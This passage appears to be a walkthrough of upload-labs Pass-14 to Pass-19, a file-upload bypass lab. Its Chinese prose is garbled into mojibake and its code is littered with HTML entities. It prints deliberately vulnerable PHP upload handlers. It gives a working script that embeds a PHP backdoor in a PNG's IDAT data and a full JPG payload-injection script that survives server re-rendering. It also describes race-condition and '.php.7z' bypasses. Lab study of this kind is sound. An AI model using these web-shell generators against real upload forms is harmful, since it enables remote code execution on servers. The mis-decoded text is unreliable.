isImage($filename)&#123; $types = &#x27;.jpeg|.png|.gif&#x27;; if(file_exists($filename))&#123; $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); if(stripos($types,$ext)&gt;=0)&#123; return $ext; &#125;else&#123; return false; &#125; &#125;else&#123; return false; &#125;&#125;$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $res = isImage($temp_file); if(!$res)&#123; $msg = &quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;; &#125;else&#123; $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).$res; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = &quot;ä¸Šä¼ å‡ºé”™ï¼&quot;; &#125; &#125;&#125; ç»•è¿‡æ–¹å¼ PHPå‡½æ•°getimagesize()å¯ä»¥è·å–å›¾ç‰‡çš„å®½ã€é«˜ç­‰ä¿¡æ¯ï¼Œå¦‚æœä¸Šä¼ çš„ä¸æ˜¯å›¾ç‰‡æ–‡ä»¶ï¼Œé‚£ä¹ˆgetimagesize()å°±è·å–ä¸åˆ°ä¿¡æ¯ï¼Œåˆ™ä¸å…è®¸ä¸Šä¼ ã€‚è€Œimage_type_to_extension()å‡½æ•°åˆ™æ ¹æ®å›¾åƒç±»å‹è¿”å›å¯¹åº”çš„åç¼€åã€‚ å’ŒPass-13ç›¸ä¼¼ï¼Œä½¿ç”¨æ–‡ä»¶åˆæˆå‘½ä»¤ç”Ÿæˆå›¾ç‰‡é©¬ã€‚ Pass-15 åˆ©ç”¨å›¾ç‰‡é©¬ç»•è¿‡exif_imagetype() ä»£ç  123456789101112131415161718192021222324252627282930313233343536function isImage($filename)&#123; //éœ€è¦å¼€å¯php_exifæ¨¡å— $image_type = exif_imagetype($filename); switch ($image_type) &#123; case IMAGETYPE_GIF: return &quot;gif&quot;; break; case IMAGETYPE_JPEG: return &quot;jpg&quot;; break; case IMAGETYPE_PNG: return &quot;png&quot;; break; default: return false; break; &#125;&#125;$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $res = isImage($temp_file); if(!$res)&#123; $msg = &quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;; &#125;else&#123; $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$res; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = &quot;ä¸Šä¼ å‡ºé”™ï¼&quot;; &#125; &#125;&#125; ç»•è¿‡æ–¹å¼ exif_imagetype()ï¼šè¯»å–ä¸€ä¸ªå›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶ç­¾åã€‚ åŒPass-13ç”Ÿæˆå›¾ç‰‡é©¬ä¸Šä¼ ç»•è¿‡ã€‚ get_imagesize()å’Œexif_imagetype()å¯¹ä¸Šä¼ çš„å›¾ç‰‡æ£€æŸ¥æœ‰ä½•ä¸åŒï¼š é€šè¿‡è°ƒç”¨exif_imagetype()å‡½æ•°åˆ¤æ–­å›¾åƒç±»å‹çš„æ–¹æ³•æ›´å…·æœ‰å®¹é”™æ€§ã€èƒ½å¤Ÿå¯¹æ— æ³•æ­£å¸¸æ˜¾ç¤ºçš„å›¾ç‰‡é©¬è¿›è¡Œæ­£å¸¸å¤„ç†ï¼›è€Œé€šè¿‡è°ƒç”¨getimagesize()å‡½æ•°å’Œimage_type_to_extension()å‡½æ•°æ¥è·å–å›¾åƒç±»å‹å¹¶è®¾ç½®åç¼€åçš„æ–¹æ³•æ˜¯æ²¡åŠæ³•å¯¹æ— æ³•æ­£å¸¸æ˜¾ç¤ºçš„å›¾ç‰‡é©¬è¿›è¡Œæ­£å¸¸å¤„ç†çš„ã€‚ Pass-16 äºŒæ¬¡æ¸²æŸ“ç»•è¿‡ ä»£ç  12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;]))&#123; // è·å¾—ä¸Šä¼ æ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯ï¼Œæ–‡ä»¶åï¼Œç±»å‹ï¼Œå¤§å°ï¼Œä¸´æ—¶æ–‡ä»¶è·¯å¾„ $filename = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $filetype = $_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;]; $tmpname = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $target_path=UPLOAD_PATH.&#x27;/&#x27;.basename($filename); // è·å¾—ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•å $fileext= substr(strrchr($filename,&quot;.&quot;),1); //åˆ¤æ–­æ–‡ä»¶åç¼€ä¸ç±»å‹ï¼Œåˆæ³•æ‰è¿›è¡Œä¸Šä¼ æ“ä½œ if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡ $im = imagecreatefromjpeg($target_path); if($im == false)&#123; $msg = &quot;è¯¥æ–‡ä»¶ä¸æ˜¯jpgæ ¼å¼çš„å›¾ç‰‡ï¼&quot;; @unlink($target_path); &#125;else&#123; //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å srand(time()); $newfilename = strval(rand()).&quot;.jpg&quot;; //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰ $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename; imagejpeg($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = &quot;ä¸Šä¼ å‡ºé”™ï¼&quot;; &#125; &#125;else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡ $im = imagecreatefrompng($target_path); if($im == false)&#123; $msg = &quot;è¯¥æ–‡ä»¶ä¸æ˜¯pngæ ¼å¼çš„å›¾ç‰‡ï¼&quot;; @unlink($target_path); &#125;else&#123; //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å srand(time()); $newfilename = strval(rand()).&quot;.png&quot;; //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰ $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename; imagepng($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = &quot;ä¸Šä¼ å‡ºé”™ï¼&quot;; &#125; &#125;else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡ $im = imagecreatefromgif($target_path); if($im == false)&#123; $msg = &quot;è¯¥æ–‡ä»¶ä¸æ˜¯gifæ ¼å¼çš„å›¾ç‰‡ï¼&quot;; @unlink($target_path); &#125;else&#123; //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å srand(time()); $newfilename = strval(rand()).&quot;.gif&quot;; //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰ $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename; imagegif($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = &quot;ä¸Šä¼ å‡ºé”™ï¼&quot;; &#125; &#125;else&#123; $msg = &quot;åªå…è®¸ä¸Šä¼ åç¼€ä¸º.jpg|.png|.gifçš„å›¾ç‰‡æ–‡ä»¶ï¼&quot;; &#125;&#125; ç»•è¿‡æ–¹å¼ ç»•è¿‡æ€è·¯ï¼šå¯¹æ¯”ä¸Šä¼ å‰å’Œä¸Šä¼ åçš„å›¾ç‰‡çš„å·®å¼‚ï¼Œæ‰¾åˆ°ç›¸åŒæ•°æ®åŒæ—¶åˆæ˜¯éå›¾ç‰‡æ•°æ®åŒºçš„åœ°æ–¹ï¼Œåœ¨åœ¨ï¼Œæ­¤å¤„å†™å…¥æ¶æ„ä»£ç ã€‚ ä¸åŒå›¾åƒç±»å‹çš„æ’å…¥æ–¹å¼æœ‰åŒºåˆ«ã€‚ GIF GIFäºŒæ¬¡æ¸²æŸ“ç»•è¿‡è¯´æ˜¯æœ€ç®€å•çš„ï¼Œå°†æºæ–‡ä»¶å’ŒäºŒæ¬¡æ¸²æŸ“è¿‡çš„æ–‡ä»¶è¿›è¡Œæ¯”è¾ƒï¼Œæ‰¾å‡ºæºæ–‡ä»¶ä¸­æ²¡æœ‰è¢«ä¿®æ”¹çš„é‚£æ®µåŒºåŸŸï¼Œåœ¨é‚£æ®µåŒºåŸŸå†™å…¥phpä»£ç å³å¯ã€‚ ä¿å­˜ä¹‹åï¼Œä¸Šä¼ è¯¥ä¿®æ”¹åçš„å›¾ç‰‡ï¼Œèƒ½å¤ŸæˆåŠŸåˆ©ç”¨ï¼š PNG pngå’Œjpgå½“ç„¶æ²¡æœ‰gifè¿™ä¹ˆç®€å•ã€‚è¿™é‡Œæˆ‘ä¹Ÿä¸ç»†åˆ†æäº†(åˆ†æä¸æ¥~~) ç›´æ¥è®°ä¸ªæ–¹æ³•,å°†phpä»£ç å†™å…¥IDATæ•°æ®å—ã€‚ ç”¨å›½å¤–å¤§ç‰›çš„è„šæœ¬ï¼Œç›®çš„æ˜¯å‘PNGå›¾ç‰‡çš„IDATæ•°æ®å—ä¸­æ’å…¥PHPåé—¨ä»£ç &lt;?=$_GET[0]($_POST[1]);?&gt; ï¼š 12345678910111213141516171819202122232425&lt;?php$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33);$img = imagecreatetruecolor(32, 32);for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123; $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color);&#125;imagepng($img,&#x27;./1.png&#x27;);?&gt; ç›´æ¥è¿è¡Œè¯¥è„šæœ¬ç”Ÿæˆ1.pngä¸Šä¼ å³å¯ã€‚ JPG JPGå›¾ç‰‡ä¹Ÿä½¿ç”¨è„šæœ¬æ¥ç”Ÿæˆï¼Œæ ¹æ®å…·ä½“æƒ…å†µæ¥æ›´æ”¹miniPayloadçš„å€¼ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169&lt;?php /* The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled(). It is necessary that the size and quality of the initial image are the same as those of the processed image. 1) Upload an arbitrary image via secured files upload script 2) Save the processed image and launch: jpg_payload.php &lt;jpg_name.jpg&gt; In case of successful injection you will get a specially crafted image, which should be uploaded again. Since the most straightforward injection method is used, the following problems can occur: 1) After the second processing the injected data may become partially corrupted. 2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;. If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image. Sergey Bobrov @Black2Fan. See also: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ */ $miniPayload = &quot;&lt;?=phpinfo();?&gt;&quot;; if(!extension_loaded(&#x27;gd&#x27;) || !function_exists(&#x27;imagecreatefromjpeg&#x27;)) &#123; die(&#x27;php-gd is not installed&#x27;); &#125; if(!isset($argv[1])) &#123; die(&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;); &#125; set_error_handler(&quot;custom_error_handler&quot;); for($pad = 0; $pad &lt; 1024; $pad++) &#123; $nullbytePayloadSize = $pad; $dis = new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if($dis-&gt;readShort() != 0xFFD8) &#123; die(&#x27;Incorrect SOI marker&#x27;); &#125; while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123; $marker = $dis-&gt;readByte(); $size = $dis-&gt;readShort() - 2; $dis-&gt;skip($size); if($marker === 0xDA) &#123; $startPos = $dis-&gt;seek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(&quot;\\0&quot;,$nullbytePayloadSize) . substr($outStream, $startPos); checkImage(&#x27;_&#x27;.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) &#123; while((!$dis-&gt;eof())) &#123; if($dis-&gt;readByte() === 0xFF) &#123; if($dis-&gt;readByte !== 0x00) &#123; break; &#125; &#125; &#125; $stopPos = $dis-&gt;seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(&quot;\\0&quot;,$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); &#125; elseif($correctImage) &#123; $outStream = $outStreamTmp; &#125; else &#123; break; &#125; if(checkImage(&#x27;payload_&#x27;.$argv[1], $outStream)) &#123; die(&#x27;Success!&#x27;); &#125; else &#123; break; &#125; &#125; &#125; &#125; unlink(&#x27;payload_&#x27;.$argv[1]); die(&#x27;Something\\&#x27;s wrong&#x27;); function checkImage($filename, $data, $unlink = FALSE) &#123; global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; &#125; function custom_error_handler($errno, $errstr, $errfile, $errline) &#123; global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match(&#x27;/(\\d+) extraneous bytes before marker/&#x27;, $errstr, $m)) &#123; if(isset($m[1])) &#123; $extraBytes = (int)$m[1]; &#125; &#125; &#125; class DataInputStream &#123; private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) &#123; $this-&gt;binData = &#x27;&#x27;; $this-&gt;order = $order; if(!$fromString) &#123; if(!file_exists($filename) || !is_file($filename)) die(&#x27;File not exists [&#x27;.$filename.&#x27;]&#x27;); $this-&gt;binData = file_get_contents($filename); &#125; else &#123; $this-&gt;binData = $filename; &#125; $this-&gt;size = strlen($this-&gt;binData); &#125; public function seek() &#123; return ($this-&gt;size - strlen($this-&gt;binData)); &#125; public function skip($skip) &#123; $this-&gt;binData = substr($this-&gt;binData, $skip); &#125; public function readByte() &#123; if($this-&gt;eof()) &#123; die(&#x27;End Of File&#x27;); &#125; $byte = substr($this-&gt;binData, 0, 1); $this-&gt;binData = substr($this-&gt;binData, 1); return ord($byte); &#125; public function readShort() &#123; if(strlen($this-&gt;binData) &lt; 2) &#123; die(&#x27;End Of File&#x27;); &#125; $short = substr($this-&gt;binData, 0, 2); $this-&gt;binData = substr($this-&gt;binData, 2); if($this-&gt;order) &#123; $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]); &#125; else &#123; $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]); &#125; return $short; &#125; public function eof() &#123; return !$this-&gt;binData||(strlen($this-&gt;binData) === 0); &#125; &#125;?&gt; ä½¿ç”¨æ–¹æ³•ï¼š å…ˆå°†ä¸€å¼ æ­£å¸¸çš„jpgå›¾ç‰‡ä¸Šä¼ ï¼Œä¸Šä¼ åå°†æœåŠ¡å™¨å­˜å‚¨çš„äºŒæ¬¡æ¸²æŸ“çš„å›¾ç‰‡ä¿å­˜ä¸‹æ¥ã€‚ å°†ä¿å­˜ä¸‹æ¥ç»è¿‡æœåŠ¡å™¨äºŒæ¬¡æ¸²æŸ“çš„é‚£å¼ jpgå›¾ç‰‡ï¼Œç”¨æ­¤è„šæœ¬è¿›è¡Œå¤„ç†ç”Ÿæˆpayload.jpg ç„¶åå†ä¸Šä¼ payload.jpg Pass-17 åˆ©ç”¨ç«äº‰æ¡ä»¶ç»•è¿‡ ä»£ç  123456789101112131415161718192021222324$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1); $upload_file = UPLOAD_PATH . &#x27;/&#x27; . $file_name; if(move_uploaded_file($temp_file, $upload_file))&#123; if(in_array($file_ext,$ext_arr))&#123; $img_path = UPLOAD_PATH . &#x27;/&#x27;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; rename($upload_file, $img_path); $is_upload = true; &#125;else&#123; $msg = &quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;; unlink($upload_file); &#125; &#125;else&#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125;&#125; ç»•è¿‡æ–¹å¼ æŸ¥çœ‹æºç ï¼Œå‘ç°æ˜¯ä¸ªæ¡ä»¶ç«äº‰ï¼Œä¸Šä¼ æˆåŠŸçš„æ–‡ä»¶ä¼šè¢«é‡å‘½åï¼Œè€Œä¸Šä¼ å¤±è´¥çš„æ–‡ä»¶ä¼šå…ˆä¿å­˜åœ¨uploadç›®å½•ä¸­ã€ç„¶åå†è°ƒç”¨unlink()åˆ é™¤è¯¥ä¸åˆæ³•çš„ä¸Šä¼ æ–‡ä»¶ï¼š ä»£ç å­˜åœ¨æ¡ä»¶ç«äº‰é—®é¢˜ï¼Œéæ³•æ–‡ä»¶ä¸Šä¼ åä¼šå…ˆä¿å­˜åœ¨uploadç›®å½•ä¸­ï¼Œç„¶åå†è°ƒç”¨unlink()å‡½æ•°æ¥åˆ é™¤ï¼Œåœ¨è¿™ä¸­é—´çš„æ—¶é—´å·®ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä¸æ–­ä¸Šä¼ å’Œè®¿é—®éæ³•çš„PHPæ–‡ä»¶ï¼Œé€Ÿåº¦å¤Ÿå¿«æ—¶å°±èƒ½è§¦å‘æˆåŠŸã€‚ ç”¨burpå¼€å¯ä¸¤ä¸ªintruderæ¨¡å—ï¼Œä¸€ä¸ªç”¨äºé‡å¤ä¸Šä¼ ï¼Œå¦ä¸€ä¸ªç”¨äºé‡å¤è®¿é—®ã€‚ Step1ï¼š å…ˆè®¾ç½®ä¸Šä¼ è¯·æ±‚ï¼ŒBurpæ‹¦æˆªåˆ°ä¸Šä¼ æ–‡ä»¶çš„æ•°æ®åŒ…åå‘é€åˆ°Intruderæ¨¡å—ï¼Œå› ä¸ºæ­¤å¤„æ²¡æœ‰ä»€ä¹ˆå‚æ•°éœ€è¦çˆ†ç ´ï¼Œåªæ˜¯éœ€è¦é‡å¤å‘èµ·è¯·æ±‚ï¼Œæ‰€ä»¥payloadè®¾ç½®ä¸ºNull payloads,è®¾ç½®è®¿é—®æ¬¡æ•°5000æ¬¡ï¼Œçº¿ç¨‹50ä¸ªã€‚ Step2ï¼šæ¥ä¸‹æ¥è®¾ç½®è®¿é—®è¯·æ±‚ï¼Œæµè§ˆå™¨æ„é€ è¯·æ±‚urlï¼šhttp://127.0.0.1/upload-labs-master/upload/miracle778.php,è¿›è¡Œè®¿é—®ï¼Œç„¶åç”¨burpæŠ“åŒ…åå‘é€è‡³intruderæ¨¡å—ï¼Œè®¾ç½®payloadï¼Œè¿™ä¸€æ­¥å’Œä¸Šä¼ è¯·æ±‚è®¾ç½®å·®ä¸å¤šï¼Œéƒ½æ˜¯Null payloadsã€5000æ¬¡ã€50ä¸ªçº¿ç¨‹ã€‚ Step3ï¼šè®¾ç½®å¥½ä¸¤ä¸ªæ¨¡å—ååŒæ—¶å¯åŠ¨ï¼Œè§‚å¯Ÿç»“æœï¼Œå› ä¸ºæˆ‘ä»¬ä¼ å…¥çš„phpä»£ç æ˜¯phpinfo();,æ‰€ä»¥å¦‚æœè®¿é—®æˆåŠŸçš„è¯ï¼Œä¼šè¿”å›phpçš„é…ç½®ä¿¡æ¯ã€‚ Pass-18 åˆ©ç”¨ç«äº‰æ¡ä»¶+è§£ææ¼æ´ç»•è¿‡ myupload.phpä¸­ä¿å­˜æ–‡ä»¶çš„è·¯å¾„çš„ä»£ç æ˜¯å†™å¾—æœ‰ç‚¹é—®é¢˜çš„ï¼Œå¹¶ä¸ä¼šå°†æ–‡ä»¶ä¿å­˜åœ¨uploadç›®å½•ä¸­ï¼ŒåŸå› æ˜¯ä¿å­˜è·¯å¾„çš„å­—ç¬¦ä¸²åœ¨æ‹¼æ¥æ—¶å°‘äº†ä¸ªæ–œæ /ï¼Œå› æ­¤å¯è‡ªè¡Œåœ¨myupload.phpçš„setDir()å‡½æ•°ä¸­å°†cls_upload_dirå˜é‡å¯¹åº”çš„è¯­å¥åŠ ä¸ªæ–œæ å³å¯ï¼š 12$this-&gt;cls_upload_dir = $dir.&#x27;/&#x27;; ä»£ç  index.php 12345678910111213141516171819202122232425262728293031323334353637383940$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;]))&#123; require_once(&quot;./myupload.php&quot;); $imgFileName =time(); $u = new MyUpload($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;], $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $_FILES[&#x27;upload_file&#x27;][&#x27;size&#x27;],$imgFileName); $status_code = $u-&gt;upload(UPLOAD_PATH); switch ($status_code) &#123; case 1: $is_upload = true; $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to; break; case 2: $msg = &#x27;æ–‡ä»¶å·²ç»è¢«ä¸Šä¼ ï¼Œä½†æ²¡æœ‰é‡å‘½åã€‚&#x27;; break; case -1: $msg = &#x27;è¿™ä¸ªæ–‡ä»¶ä¸èƒ½ä¸Šä¼ åˆ°æœåŠ¡å™¨çš„ä¸´æ—¶æ–‡ä»¶å­˜å‚¨ç›®å½•ã€‚&#x27;; break; case -2: $msg = &#x27;ä¸Šä¼ å¤±è´¥ï¼Œä¸Šä¼ ç›®å½•ä¸å¯å†™ã€‚&#x27;; break; case -3: $msg = &#x27;ä¸Šä¼ å¤±è´¥ï¼Œæ— æ³•ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶ã€‚&#x27;; break; case -4: $msg = &#x27;ä¸Šä¼ å¤±è´¥ï¼Œä¸Šä¼ çš„æ–‡ä»¶è¿‡å¤§ã€‚&#x27;; break; case -5: $msg = &#x27;ä¸Šä¼ å¤±è´¥ï¼ŒæœåŠ¡å™¨å·²ç»å­˜åœ¨ç›¸åŒåç§°æ–‡ä»¶ã€‚&#x27;; break; case -6: $msg = &#x27;æ–‡ä»¶æ— æ³•ä¸Šä¼ ï¼Œæ–‡ä»¶ä¸èƒ½å¤åˆ¶åˆ°ç›®æ ‡ç›®å½•ã€‚&#x27;; break; default: $msg = &#x27;æœªçŸ¥é”™è¯¯ï¼&#x27;; break; &#125;&#125; myupload.php 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677class MyUpload&#123;.................. var $cls_arr_ext_accepted = array( &quot;.doc&quot;, &quot;.xls&quot;, &quot;.txt&quot;, &quot;.pdf&quot;, &quot;.gif&quot;, &quot;.jpg&quot;, &quot;.zip&quot;, &quot;.rar&quot;, &quot;.7z&quot;,&quot;.ppt&quot;, &quot;.html&quot;, &quot;.xml&quot;, &quot;.tiff&quot;, &quot;.jpeg&quot;, &quot;.png&quot; ); .................. /** upload() ** ** Method to upload the file. ** This is the only method to call outside the class. ** @para String name of directory we upload to ** @returns void **/ function upload( $dir )&#123; $ret = $this-&gt;isUploadedFile(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;setDir( $dir ); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;checkExtension(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;checkSize(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; // if flag to check if the file exists is set to 1 if( $this-&gt;cls_file_exists == 1 )&#123; $ret = $this-&gt;checkFileExists(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; &#125; // if we are here, we are ready to move the file to destination $ret = $this-&gt;move(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; // check if we need to rename the file if( $this-&gt;cls_rename_file == 1 )&#123; $ret = $this-&gt;renameFile(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; &#125; // if we are here, everything worked as planned :) return $this-&gt;resultUpload( &quot;SUCCESS&quot; ); &#125;.................. &#125;; ç»•è¿‡æ–¹å¼ å®¡è®¡ç»™å‡ºæ¥çš„ä»£ç ï¼Œçœ‹åˆ°æœ‰ä¸ªæ¡ä»¶ç«äº‰é—®é¢˜ï¼Œå³ç¨‹åºå…ˆä¸Šä¼ æ–‡ä»¶å†é‡å‘½åæ–‡ä»¶ï¼Œ ä½†å¦‚æœåªèƒ½ä¸Šä¼ å›¾åƒæ–‡ä»¶è€Œæ²¡æœ‰æ–‡ä»¶åŒ…å«æ¼æ´ä¹Ÿä¸èƒ½getshellï¼Œä½†æ˜¯åç¼€åè¿‡æ»¤çš„ç™½åå•ä¸­åŒ…å«äº†zipã€7zã€rarç­‰Apacheä¸èƒ½è§£æçš„åç¼€åï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç«äº‰æ¡ä»¶+è§£ææ¼æ´ç»•è¿‡ã€‚ åˆ©ç”¨è¿‡ç¨‹å’ŒPass-17ä¸€æ ·ï¼Œåªæ˜¯è¿™æ¬¡ä¸Šä¼ çš„æ–‡ä»¶åç¼€æ˜¯.php.7zã€‚ Pass-19 åˆ©ç”¨\\.ç»•è¿‡ ä»£ç  1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = $_POST[&#x27;save_name&#x27;]; $file_ext = pathinfo($file_name,PATHINFO_EXTENSION); if(!in_array($file_ext,$deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125;else&#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125;else&#123; $msg = &#x27;ç¦æ­¢ä¿å­˜ä¸ºè¯¥ç±»å‹æ–‡ä»¶ï¼&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125;&#125; è¿™é‡Œå…³äºpathinfoçš„è¯´æ˜å¦‚ä¸‹å›¾ï¼š ç»•è¿‡æ–¹å¼ æ–‡ä»¶åæ˜¯é€šè¿‡POSTæ–¹å¼ä¼ 